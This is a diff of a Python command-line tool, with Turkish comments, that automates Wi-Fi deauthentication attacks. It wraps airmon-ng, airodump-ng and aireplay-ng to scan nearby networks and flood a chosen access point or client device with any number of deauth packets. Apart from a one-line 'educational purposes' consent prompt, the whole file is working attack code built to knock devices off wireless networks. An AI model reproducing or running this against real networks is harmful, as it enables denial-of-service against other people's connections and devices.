@@ -6,130 +6,73 @@ import sys
 # Kullanıcıdan onay alma
 def get_user_consent():
     print("[!] WARNING & DISCLAIMER")
-    print("This tool is for educational purposes only.")
-    consent = input("Do you accept the terms and conditions? (yes/no): ").strip().lower()
+    print("This tool is for educational purposes only. Misuse is illegal.")
+    consent = input("Do you accept the terms? (yes/no): ").strip().lower()
     if consent != "yes":
-        print("[-] Consent not given. Exiting...")
+        print("[-] Exiting...")
         sys.exit()
 
 # WiFi adaptör kontrolü
 def check_wifi_adapter():
     result = subprocess.run(["sudo", "iwconfig"], capture_output=True, text=True)
-    if "wlan0" not in result.stdout:
-        print("[-] No wireless adapter found!")
-        sys.exit()
-
-# Monitor modu başlatma
-def start_monitor_mode():
-    print("[*] Starting monitor mode...")
-    subprocess.run(["sudo", "airmon-ng", "start", "wlan0"])
-    time.sleep(3)
+    if "Mode:Monitor" not in result.stdout:
+        print("[-] Monitor mode not active! Starting...")
+        subprocess.run(["sudo", "airmon-ng", "start", "wlan0"], stderr=subprocess.DEVNULL)
 
 # Ağları tarama
 def scan_networks():
-    print("[*] Scanning networks... Press Ctrl+C to stop.")
+    print("[*] Scanning networks... (Ctrl+C to stop)")
     subprocess.run(["sudo", "airodump-ng", "wlan0mon"])
 
-# Kullanıcıdan hedef ağ seçimi
-def select_target_network():
-    target_mac = input("[?] Enter the target network MAC address: ").strip()
-    return target_mac
-
-# Kullanıcıdan kanal bilgisi alma
-def get_target_channel():
-    channel = input("[?] Enter the channel of the target network: ").strip()
-    return channel
-
-# Ağa bağlı cihazları tarama
-def scan_connected_devices(target_mac, channel):
-    print(f"[*] Scanning devices in {target_mac} on channel {channel}...")
-    subprocess.run(["sudo", "airodump-ng", "--bssid", target_mac, "--channel", channel, "wlan0mon"])
-
-# Kullanıcıdan hedef cihaz seçimi alma
-def select_target_device(target_mac, channel):
-    choice = input("[?] Do you want to target a specific device? (yes/no): ").strip().lower()
-    if choice == "yes":
-        scan_connected_devices(target_mac, channel)
-        client_mac = input("[?] Enter the device MAC address: ").strip()
-        return client_mac
+# Hedef arayüzü otomatik algıla
+def detect_monitor_interface():
+    result = subprocess.run(["sudo", "iwconfig"], capture_output=True, text=True)
+    for line in result.stdout.split('\n'):
+        if "Mode:Monitor" in line:
+            return line.split()[0]
     return None
 
-# Paket sayısını belirleme
-def select_deauth_packet_count():
-    packet_count = input("[?] Enter the number of deauth packets: ").strip()
-    if not packet_count.isdigit():
-        print("[-] Invalid input, defaulting to 5 packets.")
-        return "5"
-    return packet_count
-
-import subprocess
-
-import subprocess
-
-import subprocess
-
-# Deauthentication saldırısını başlatma
+# Deauth saldırısı
 def start_deauth_attack(target_mac, client_mac, packet_count):
-    # Paket sayısını doğrulama
-    if not str(packet_count).isdigit():  
-        print("[-] Invalid packet count, defaulting to 10.")
-        packet_count = "10"
-    else:
-        packet_count = str(packet_count)  # Aireplay-ng string format bekliyor
-    
-    print(f"[*] Running attack with {packet_count} packets...")
+    interface = detect_monitor_interface()
+    if not interface:
+        print("[-] Monitor interface not found!")
+        return
 
-    # Wi-Fi arayüzünü belirleme
-    interface = "wlan0mon"
-
-    # Önce arayüzü test edelim!
-    check_interface = subprocess.run(["sudo", "iwconfig"], capture_output=True, text=True)
-    print("[DEBUG] iwconfig Output:", check_interface.stdout)
-
-    if "wlan0mon" not in check_interface.stdout:
-        print("[-] Monitor mode interface not found! Restarting...")
-        subprocess.run(["sudo", "airmon-ng", "stop", "wlan0mon"])
-        subprocess.run(["sudo", "airmon-ng", "start", "wlan0"])
-
-    # Hedeflenen cihaza saldırı mı, yoksa SSID’ye genel saldırı mı?
+    command = [
+        "sudo", "aireplay-ng", "--deauth", str(packet_count),
+        "-a", target_mac, interface
+    ]
     if client_mac:
-        print(f"[*] Attacking {client_mac} in {target_mac} network...")
-        command = ["sudo", "aireplay-ng", "--deauth", packet_count, "-a", target_mac, "-c", client_mac, "-i", interface, "--ignore-negative-one"]
-    else:
-        print(f"[*] Attacking entire {target_mac} network (SSID focus)...")
-        command = ["sudo", "aireplay-ng", "--deauth", packet_count, "-a", target_mac, "-i", interface, "--ignore-negative-one"]
+        command.insert(6, "-c")
+        command.insert(7, client_mac)
 
-    # Saldırıyı başlat ve çıktıyı al
     result = subprocess.run(command, capture_output=True, text=True)
-
-    # Çıktı ve hata kontrolü
-    if result.returncode == 0:
-        print("[+] Attack successfully executed!")
+    
+    if "sent" in result.stdout:
+        print(f"[+] {packet_count} packets sent to {target_mac}!")
     else:
-        print("[-] Error executing aireplay-ng! Check permissions or dependencies.")
+        print(f"[-] Failed: {result.stderr.strip()}")
 
-    print("[DEBUG] Command Output:", result.stdout)  # 🛠 Tam komut çıktısını gösteriyoruz!
-    print("[DEBUG] Command Error:", result.stderr)  # 🛠 Eğer hata varsa, bunun nedenini görebileceğiz!
+# Paket sayısı inputu
+def get_packet_count():
+    while True:
+        count = input("[?] Deauth packets (1-∞): ").strip()
+        if count.isdigit() and int(count) > 0:
+            return int(count)
+        print("[-] Invalid! Enter a positive integer (e.g: 1000).")
 
-# Ana akış
+# Ana işlem
 def main():
     get_user_consent()
     check_wifi_adapter()
-    start_monitor_mode()
     scan_networks()
-
-    target_mac = select_target_network()
-    channel = get_target_channel()
-    client_mac = select_target_device(target_mac, channel)
-
-    while True:
-        packet_count = select_deauth_packet_count()
-        start_deauth_attack(target_mac, client_mac, packet_count)
-
-        repeat = input("[?] Would you like to perform another attack? (yes/no): ").strip().lower()
-        if repeat != "yes":
-            print("[+] Exiting...")
-            sys.exit()
+    
+    target_mac = input("[?] Target network MAC: ").strip()
+    client_mac = input("[?] Specific device MAC (or skip): ").strip() or None
+    packet_count = get_packet_count()
+    
+    start_deauth_attack(target_mac, client_mac, packet_count)
 
 if __name__ == "__main__":
     main()
